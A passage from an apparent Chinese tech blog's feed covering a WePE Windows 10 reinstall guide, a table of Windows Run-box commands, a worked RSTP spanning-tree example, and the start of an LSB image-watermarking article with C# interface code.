src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/DiskGenius-快速分区.png" alt="DiskGenius-快速分区"></center><h3 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h3><h4 id="镜像文件安装"><a href="#镜像文件安装" class="headerlink" title="镜像文件安装"></a>镜像文件安装</h4><ol><li>找到Win10镜像文件，并将其<strong>挂载</strong>。</li><li>进入Win10镜像的<strong>sources目录</strong>中，并找到<strong>setup.exe</strong>可执行程序，然后双击打开，操作界面如图所示。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/iso-source-setup.png" alt="iso-source-setup"></center><ol><li>之后会进入WIn10的安装界面。</li></ol><h4 id="winNTSetup"><a href="#winNTSetup" class="headerlink" title="winNTSetup"></a>winNTSetup</h4><ol><li><p>先将镜像文件<strong>挂载</strong>，或者<strong>解压</strong>。</p></li><li><p>打开<strong>winNTSetup</strong>，选择<strong>【windows Vista/7/8/10/2008/2012】</strong>选项卡：</p><ul><li>将<strong>选择包含Windows暗转文件夹的文件</strong>的路径信息指定到上一步<strong>挂载</strong>或<strong>解压</strong>的Windows镜像中<strong>install.wim</strong>文件所在的路径下(一般路径为/sources/install.wim)；</li><li><strong>选择引导驱动器选择</strong>默认为C盘即可；</li><li>磁盘的<strong>安装位置</strong>选择<strong>C盘</strong>；</li><li>选择安装的Win10版本(win10pro/home等)；</li><li>设置完毕之后点击<strong>【开始安装】</strong>。</li></ul><p>设置界面结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup.png" alt="WinNTSetup"></center></li><li><p>在<strong>准备确认界面</strong>勾选<strong>【安装成功后自动重启计算机】</strong>选项，并点击<strong>【确认】</strong>按钮，操作如下图所示：</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup-准备界面.png" alt="WinNTSetup"></center><ol start="4"><li>之后镜像文件需要一段时间的部署，等部署完成之后计算机自动重启，并进入Win10的安装界面。</li></ol><p>部署过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/WinNTSetup-安装过程.png" alt="WinNTSetup-安装过程"></center><h4 id="CGI备份还原"><a href="#CGI备份还原" class="headerlink" title="CGI备份还原"></a>CGI备份还原</h4><ol><li><p>打开<strong>CGI备份还原</strong>，选择<strong>【操作分区】</strong>选项卡中：</p><ul><li><p>选择<strong>还原分区</strong>；</p></li><li><p>指定还原的分区(<strong>C盘</strong>)；</p></li><li><p>指定<strong>镜像文件</strong>或<strong>Ghost文件</strong>所在的路径，操作如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/CGI-操作分区.png" alt="CGI-操作分区"></center></li><li><p>单击<strong>【执行】</strong>按钮，并在弹出的<strong>还原分区界面</strong>勾选<strong>【重启】</strong>选项，点击<strong>【确定】</strong>按钮，操作如下图所示；</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WePE/CGI-还原分区.png" alt="CGI-还原分区"></center></li><li><p>接下来需要等待程序操作完成，即可使用新的系统。</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WePE </tag>
            
            <tag> Win10 </tag>
            
            <tag> 系统安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运行框常用命令及功能</title>
      <link href="/2020/08/27/yun-xing-kuang-chang-yong-ming-ling-ji-gong-neng/"/>
      <url>/2020/08/27/yun-xing-kuang-chang-yong-ming-ling-ji-gong-neng/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">命令名称</th><th align="center">功    能</th></tr></thead><tbody><tr><td align="center">msconfig</td><td align="center">系统配置程序</td></tr><tr><td align="center">regedit</td><td align="center">注册表编辑器</td></tr><tr><td align="center">cmd</td><td align="center">命令提示符</td></tr><tr><td align="center">calc</td><td align="center">计算器</td></tr><tr><td align="center">devmgmt.msc</td><td align="center">设备管理器</td></tr><tr><td align="center">dfrgui</td><td align="center">磁盘碎片整理程序</td></tr><tr><td align="center">compmgmt.msc</td><td align="center">计算机管理</td></tr><tr><td align="center">gpedit.msc</td><td align="center">本地组策略编辑器</td></tr><tr><td align="center">notepad</td><td align="center">记事本</td></tr><tr><td align="center">secpol.msc</td><td align="center">本地安全策略</td></tr><tr><td align="center">services.msc</td><td align="center">服务设置</td></tr><tr><td align="center">logoff</td><td align="center">注销命令</td></tr><tr><td align="center">appwiz.cpl</td><td align="center">程序和功能</td></tr><tr><td align="center">certmgr.msc</td><td align="center">证书管理程序</td></tr><tr><td align="center">charmap</td><td align="center">启动字符映射表</td></tr><tr><td align="center">cleanmgr</td><td align="center">打开磁盘清理工具</td></tr><tr><td align="center">cliconfg</td><td align="center">SQL SERVER 客户端网络实用工具</td></tr><tr><td align="center">cmstp</td><td align="center">连接管理器配置文件安装程序</td></tr><tr><td align="center">colorcpl</td><td align="center">颜色管理，配置显示器和打印机等中的色彩</td></tr><tr><td align="center">comexp.msc</td><td align="center">打开系统组件服务</td></tr><tr><td align="center">control</td><td align="center">控制面版</td></tr><tr><td align="center">desk.cpl</td><td align="center">屏幕分辨率</td></tr><tr><td align="center">diskmgmt.msc</td><td align="center">磁盘管理</td></tr><tr><td align="center">dxdiag</td><td align="center">检查DirectX信息</td></tr><tr><td align="center">eudcedit</td><td align="center">造字程序</td></tr><tr><td align="center">eventvwr</td><td align="center">事件查看器</td></tr><tr><td align="center">explorer</td><td align="center">打开资源管理器</td></tr><tr><td align="center">firewall.cpl</td><td align="center">防火墙程序</td></tr><tr><td align="center">wf.msc</td><td align="center">高级安全Windows防火墙</td></tr><tr><td align="center">fsmgmt.msc</td><td align="center">共享文件夹管理器</td></tr><tr><td align="center">intl.cpl</td><td align="center">区域</td></tr><tr><td align="center">iexpress</td><td align="center">木马捆绑工具，系统自带</td></tr><tr><td align="center">lpksetup</td><td align="center">语言包安装/删除向导，安装向导会提示下载语言包</td></tr><tr><td align="center">main.cpl</td><td align="center">鼠标属性</td></tr><tr><td align="center">mmsys.cpl</td><td align="center">声音</td></tr><tr><td align="center">magnify</td><td align="center">放大镜实用程序</td></tr><tr><td align="center">MdSched</td><td align="center">Windows内存诊断程序</td></tr><tr><td align="center">mmc</td><td align="center">MMC管理控制台</td></tr><tr><td align="center">msinfo32</td><td align="center">系统信息</td></tr><tr><td align="center">mspaint</td><td align="center">画图</td></tr><tr><td align="center">mstsc</td><td align="center">远程桌面连接</td></tr><tr><td align="center">OptionalFeatures</td><td align="center">打开“打开或关闭Windows功能”对话框</td></tr><tr><td align="center">perfmon.msc</td><td align="center">计算机性能监测器</td></tr><tr><td align="center">PowerShell</td><td align="center">提供强大远程处理能力</td></tr><tr><td align="center">printmanagement.msc</td><td align="center">打印管理</td></tr><tr><td align="center">powercfg.cpl</td><td align="center">电源选项</td></tr><tr><td align="center">psr</td><td align="center">问题步骤记录器</td></tr><tr><td align="center">Rasphone</td><td align="center">网络连接</td></tr><tr><td align="center">Recdisc</td><td align="center">创建系统修复光盘</td></tr><tr><td align="center">Resmon</td><td align="center">资源监视器</td></tr><tr><td align="center">Rstrui</td><td align="center">系统还原</td></tr><tr><td align="center">rsop.msc</td><td align="center">组策略结果集</td></tr><tr><td align="center">sdclt</td><td align="center">备份状态与配置，就是查看系统是否已备份</td></tr><tr><td align="center">sigverif</td><td align="center">文件签名验证程序</td></tr><tr><td align="center">slui</td><td align="center">Windows激活，查看系统激活信息</td></tr><tr><td align="center">snippingtool</td><td align="center">截图工具</td></tr><tr><td align="center">sysdm.cpl</td><td align="center">系统属性</td></tr><tr><td align="center">taskmgr</td><td align="center">任务管理器</td></tr><tr><td align="center">taskschd.msc</td><td align="center">任务计划程序</td></tr><tr><td align="center">timedate.cpl</td><td align="center">日期和时间</td></tr><tr><td align="center">UserAccountControlSettings</td><td align="center">用户账户控制设置</td></tr><tr><td align="center">winver</td><td align="center">关于Windows</td></tr><tr><td align="center">mrt</td><td align="center">恶意软件删除工具</td></tr><tr><td align="center">mip</td><td align="center">数学输入面板</td></tr><tr><td align="center">tpm.msc</td><td align="center">受信任的平台(TPM)管理</td></tr><tr><td align="center">sndvol</td><td align="center">音量合成器</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 运行 </tag>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSTP应用实例</title>
      <link href="/2020/08/27/rstp-ying-yong-shi-li/"/>
      <url>/2020/08/27/rstp-ying-yong-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="RSTP应用实例"><a href="#RSTP应用实例" class="headerlink" title="RSTP应用实例"></a>RSTP应用实例</h1><p>​        存在某网络拓扑如图1所示，各个网桥端口传输速率均为100Mbps，所有连接均无故障.</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP实例网络拓扑.png" alt="RSTP实例网络拓扑"></center><center>图1</center><p>​    则使用RSTP协议构建的生成树如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP构建的生成树.png" alt="RSTP构建的生成树"></center><center>图2</center><h1 id="定期维护网络拓扑结构"><a href="#定期维护网络拓扑结构" class="headerlink" title="定期维护网络拓扑结构"></a>定期维护网络拓扑结构</h1><p>​        RSTP成功构建生成树后，每当<strong>间隔时间定时器</strong>溢出时，网桥每一个<strong>指定端口</strong>发送各自的端口BPDU（如图3所示）。由于每个端口的最优BPDU的<strong>溢出定时器</strong>初值是3×（Hello Time），因此，只要在3×（Hello Time）时间内接收到该端口最优BPDU，该端口最优BPDU就保持有效，网络拓扑就维持不变。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/RSTP构建的生成树(BPDU).png" alt="RSTP构建的生成树(BPDU)"></center><center>图3</center><h1 id="拓扑结构改变时端口状态迁移过程"><a href="#拓扑结构改变时端口状态迁移过程" class="headerlink" title="拓扑结构改变时端口状态迁移过程"></a>拓扑结构改变时端口状态迁移过程</h1><h2 id="BID-1与BID-2连接断开"><a href="#BID-1与BID-2连接断开" class="headerlink" title="BID=1与BID=2连接断开"></a>BID=1与BID=2连接断开</h2><p>​        如果图3的生成树中互连BID=1网桥和BID=2网桥之间的链路发生故障（如图4所示），BID=2网桥由于持续3×（Hello Time）时间没有接收到网桥最优BPDU，导致<font color="blue">BID=2网桥回到初始状态，将自己作为根网桥</font>，此时BID=2网桥各个端口BPDU如图4中所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID1和BID2断开.png" alt="BID1和BID2断开"></center><center>图4</center><p>​        每当间隔时间定时器溢出时，BID=2网桥的每一个端口就发送各自的端口BPDU。</p><p><strong>BID=2网桥与BID=3网桥</strong>：</p><p>​        当BID=3网桥端口1接收到<strong>BPDU=&lt;2,0,2,4&gt;</strong>时，由于端口1的端口<strong>BPDU=&lt;1,19,3,1&gt;</strong>优于收到的BPDU，该端口角色转换为<strong>指定端口</strong>，端口状态仍为<strong>丢弃状态</strong>，如图5所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID24BPDU-BID31.png" alt="BID24BPDU-BID31"></center><center>图5</center><p>​        由于BID=3端口1的端口角色转变为指定端口，但端口状态仍为丢弃状态，此时端口1会向BID=2的端口4发送<strong>Proposal BPDU=&lt;1,19,3,1&gt;</strong>。当BID=2网桥端口4收到该Proposal BPDU后，确定该BPDU为网桥最优BPDU，则指定端口4为<strong>根端口</strong>，如图6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID3-PropocalBPDU-BID2.png" alt="BID3-PropocalBPDU-BID2"></center><center>图6</center><p>​        BID=2网桥确定端口4为根端口后，确定端口4的开销为38，且其<strong>BPDU=&lt;1,38,2,4&gt;</strong>,此时BID=2网桥其他端口的BPDU如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-BPDU.png" alt="BID2-BPDU"></center><center>图7</center><p>​        由于BID=2网桥端口4是根端口，且各个端口状态为丢弃状态，BID=2网桥通过端口4发送<strong>Agreement BPDU</strong>。BID=3网桥端口1接收到Agreement BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图8所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-AgreementBPDU-BID3.png" alt="BID2-AgreementBPDU-BID3"></center><center>图8</center><p>​        每当间隔时间定时器溢出时，BID=3网桥端口1发送标志位<strong>Forwarding置位的BPDU</strong>。BID=2网桥端口4接收到该BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图9所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID3-ForwordingBPDU-BID2.png" alt="BID3-ForwordingBPDU-BID2"></center><center>图9</center><p><strong>BID=2网桥与BID=4网桥</strong>：</p><p>​        当BID=4网桥通过端口1接收到<strong>BPDU=&lt;2,0,2,2&gt;</strong>,通过端口2接收到<strong>BPDU=&lt;2,0,2,3&gt;</strong>，通过端口3接收到<strong>BPDU=&lt;1,19,3,3&gt;</strong>时，确根端口3为<strong>根端口</strong>，端口3状态<strong>直接转变为转发状态</strong>（如图10所示），由此得到BID=4网桥的根路径开销为38，以此推到出BID=4网桥其他端口的端口BPDU如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4根端口确定.png" alt="BID4根端口确定"></center><center>图10</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4-BPDU.png" alt="BID4-BPDU"></center><center>图11</center><p>​        每当间隔时间定时器溢出时，BID=4网桥的端口1发送<strong>Proposal BPDU=&lt;1,38,4,1&gt;</strong>，端口2发送<strong>Proposal BPDU=&lt;1,38,4,2&gt;</strong>，如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4-Proposal BPDU-BID2.png" alt="BID4-Proposal BPDU-BID2"></center><center>图12</center><p>​        当BID=2网桥通过端口2接收到<strong>Proposal BPDU=&lt;1,38,4,1&gt;</strong>时，由于端口2的端口<strong>BPDU=&lt;1,38,2,2&gt;</strong>优于接收到的BPDU，端口2维持指定端口角色不变，发送<strong>Proposal BPDU=&lt;1,38,2,2&gt;</strong>。端口3同样维持指定角色不变，发送<strong>Proposal BPDU=&lt;1,38,2,3&gt;</strong>，如图13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2-Proposal BPDU-BID4.png" alt="BID2-Proposal BPDU-BID4"></center><center>图13</center><p>​        当BID=4网桥通过端口1接收到<strong>Proposal BPDU=&lt;1,38,2,2&gt;</strong>时，由于该BPDU优先于端口<strong>BPDU=&lt;1,38,4,1&gt;</strong>，端口1的端口角色转变为<strong>替换端口</strong>（如图14所示），由于该端口为替换端口，且其他指定端口状态为丢弃状态，BID=4网桥通过端口1发送<strong>Agreement BPDU</strong>。当BID=4网桥通过端口2接收到<strong>Proposal BPDU=&lt;1,38,2,3&gt;</strong>时，端口2的端口角色同样转变为<strong>替换端口</strong>，并通过端口2发送<strong>Agreement BPDU</strong>。（如图15所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID4改变端口角色.png" alt="BID4改变端口角色"></center><center>图14</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/BID2改变端口状态.png" alt="BID2改变端口状态"></center><center>图15</center><p>​        当BID=2网桥分别通过端口2和端口3接收到Agreement BPDU时，两个端口的状态转换为<strong>转发状态</strong>，如图16所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图16.png" alt="图16"></center><center>图16</center><p>​        完成上述过程后，重新构建的生成树即完成（如图17所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/重构生成树.png" alt="重构生成树"></center><center>图17</center><h2 id="扩展：BID-1与BID-3连接断开"><a href="#扩展：BID-1与BID-3连接断开" class="headerlink" title="扩展：BID=1与BID=3连接断开"></a>扩展：BID=1与BID=3连接断开</h2><p>​        如果生成树中互连BID=1网桥和BID=3网桥之间的链路发生故障（如图18所示），BID=3网桥由于持续3×（Hello Time）时间没有接收到网桥最优BPDU，导致<font color="blue">BID=3网桥回到初始状态，将自己作为根网桥</font>，此时BID=3网桥各个端口BPDU如图18中所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图18.png" alt="图18"></center><center>图18</center><p>​        每当间隔时间定时器溢出时，BID=3网桥的每一个端口就发送各自的端口BPDU。</p><p><strong>BID=3网桥与BID=2网桥</strong>：</p><p>​        当BID=2网桥端口4接收到<strong>BPDU=&lt;3,0,3,1&gt;</strong>时，由于端口4的端口<strong>BPDU=&lt;1,19,2,4&gt;</strong>优于收到的BPDU，该端口角色仍为<strong>指定端口</strong>，端口状态仍为<strong>转发状态</strong>，如图19所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图19.png" alt="图19"></center><center>图19</center><p>​        BID=2的端口4会向BID=3的端口1发送<strong>proposal BPDU=&lt;1,19,2,4&gt;</strong>。当BID=3网桥端口1收到该Proposal BPDU后，确定该BPDU为网桥<strong>最优BPDU</strong>，则执行端口1为<strong>根端口</strong>，而端口状态仍为<strong>丢弃状态</strong>，如图20所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图20.png" alt="图20"></center><center>图20</center><p>​        BID=3网桥确定端口1为根端口后，确定端口1的开销为38，且其<strong>BPDU=&lt;1,38,3,1&gt;</strong>,此时BID=3网桥其他端口的BPDU如图21所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图21.png" alt="图21"></center><center>图21</center><p>​        由于BID=3网桥端口1是根端口，且各个端口状态为丢弃状态，BID=3网桥通过端口1发送<strong>Agreement BPDU</strong>。BID=2网桥端口4接收到Agreement BPDU后，端口状态仍为<strong>转发状态</strong>（如图22所示）并向BID=3端口1发送一个<strong>Agreement BPDU</strong>。当BID=3端口1接收到该Agreement BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图23所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图22.png" alt="图22"></center><center>图22</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图23.png" alt="图23"></center><center>图23</center><p><strong>BID=4网桥</strong>：</p><p>​        当BID=4网桥通过端口1接收到<strong>BPDU=&lt;1,19,2,2&gt;</strong>,通过端口2接收到<strong>BPDU=&lt;1,19,2,3&gt;</strong>，通过端口3接收到<strong>BPDU=&lt;3,0,3,3&gt;</strong>时，确根端口1为<strong>根端口</strong>，端口3角色<strong>转变为根端口</strong>，端口状态仍为<strong>丢弃状态</strong>（如图24所示），由此得到BID=4网桥的根路径开销为38，以此推到出BID=4网桥其他端口的端口BPDU如图25所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图24.png" alt="图24"></center><center>图24</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图25.png" alt="图25"></center><center>图25</center><p>​        由于BID=4网桥端口1是根端口，且各个端口状态均为丢弃状态，BID=4网桥通过端口1发送Agreement BPDU。BID=2网桥端口2接收到Agreement BPDU后，端口状态仍为<strong>转发状态</strong>，如图26所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图26.png" alt="图26"></center><center>图26</center><p>​        每当间隔时间定时器溢出时，BID=2网桥端口2发送置位标志位Forwarding置位的BPDU。BID=4网桥端口1接收到该BPDU后，将端口状态转变为<strong>转发状态</strong>。（如图27所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图27.png" alt="图27"></center><center>图27</center><p>​        BID=4网桥通过端口2向BID=2发送Proposal BPDU，通过端口3向BID=3发送Proposal（如图28所示）。当BID=2端口3接收到Proposal BPDU后，判断本端口BPDU更优，端口角色保持不变，端口状态仍为转发状态（如图29所示）。当BID=3端口3接收到Proposal BPDU后，判断本端口BPDU更优，端口角色保持不变，端口状态转变为转发状态（如图29所示）。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图28.png" alt="图28"></center><center>图28</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图29.png" alt="图29"></center><center>图29</center><p>​        当BID=4端口2接收到Proposal BPDU后，由于该BPDU优于端口BPDU=&lt;1,38,4,2&gt;，端口角色转变为替换角色，端口状态仍为丢弃状态（如图30所示）。当BID=4端口3接收到Proposal BPDU后，由于该BPDU优于端口BPDU=&lt;1,38,4,3&gt;，端口角色转变为替换角色，端口状态转变仍为丢弃状态（如图30所示）。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图30.png" alt="图30"></center><center>图30</center><p>​        完成上述过程后，重新构建的生成树即完成（如图31所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/RSTP应用实例/图31.png" alt="图31"></center><center>图31</center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考资料</strong>：</p><p>《路由和交换技术(第2版)》</p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSTP </tag>
            
            <tag> 网络协议 </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB算法分析与实现</title>
      <link href="/2020/08/27/lsb-suan-fa-fen-xi-yu-shi-xian/"/>
      <url>/2020/08/27/lsb-suan-fa-fen-xi-yu-shi-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="数字水印"><a href="#数字水印" class="headerlink" title="数字水印"></a>数字水印</h1><p>​        数字水印（Digital Watermark）是一种应用<strong>计算机算法</strong>嵌入载体文件的<strong>保护信息</strong>，数字水印技术是一种基于内容的、非密码机制的计算机信息隐藏技术，它是将一些标识信息（即数字水印）<strong>直接嵌入数字载体</strong>当中（包括多媒体、文档、软件等）或是<strong>间接表示</strong>（修改特定区域的结构），且不影响原载体的使用价值，也不容易被探知和再次修改，但可以被生产方识别和辨认。</p><p>​        常用的数字水印有很多种，LSB是其中一种简单的隐写算法。</p><h1 id="LSB简介"><a href="#LSB简介" class="headerlink" title="LSB简介"></a>LSB简介</h1><p>​        LSB全称为 Least Significant Bit（最低有效位），是一种常被用做图片隐写的算法（在CTF中经常见到她的身影）。LSB属于空域算法中的一种，是将信息嵌入到图像点中像素位的最低位，以保证嵌入的信息是不可见的，但是由于使用了图像不重要的像素位，算法的鲁棒性差，水印信息很容易为滤波、图像量化、几何变形的操作破坏。</p><h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><p>​        PNG和BMP图片中的图像像素一般是有由RGB三原色组成（如图1所示），每一种颜色占用8位，取值范围为0x00~0xFF，既有$2^{24}$种色值。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类眼睛无法区分的颜色还有600多万。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/RGB.png" alt="RGB"></center><center>图1</center><p>当仅仅更改颜色分量的最低位时，人类的眼睛不能区分这前后的变化，LSB就是在该位置存放信息。如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB.png" alt="LSB"></center><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>将图像文件中的所有像素点以<strong>RGB</strong>形式分隔开，并将各个<strong>颜色分量</strong>转换成<strong>二进制</strong>表示</li><li>把每个颜色分量值的<strong>最后一位全部设置成0</strong>，对图像得影响非常细微，不会影响图像的显示格式</li><li>信息嵌入：将水印字符转化为二进制字符串，并将这些信息<strong>依次填入颜色分量的最低位上</strong>，即可完成信息的嵌入</li><li>信息提取：将图像像素的<strong>最低位依次提取</strong>出来，并进行拼接，即可得到原始信息</li></ol><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>嵌入信息框图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB-Embed.png" alt="LSB-Embed"></center><p><strong>提取信息框图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/LSB-Extract.png" alt="LSB-Extract"></center><p><strong>文档结构</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/文档结构.png" alt="文档结构"></center><p><strong>程序主界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/主界面.png" alt="主界面"></center><p><strong>主界面代码</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">MainFrm</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        Form frm<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">MainFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 嵌入按钮得Click事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnEnbed_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            frm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InfoEmbedmentFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>frm<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>Cancel<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Application<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取按钮的Click事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnExtract_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            frm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InfoExtractionFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>frm<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>Cancel<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Application<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>嵌入界面</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/嵌入界面.png" alt="嵌入界面"></center><p><strong>嵌入界面代码</strong>：</p><pre 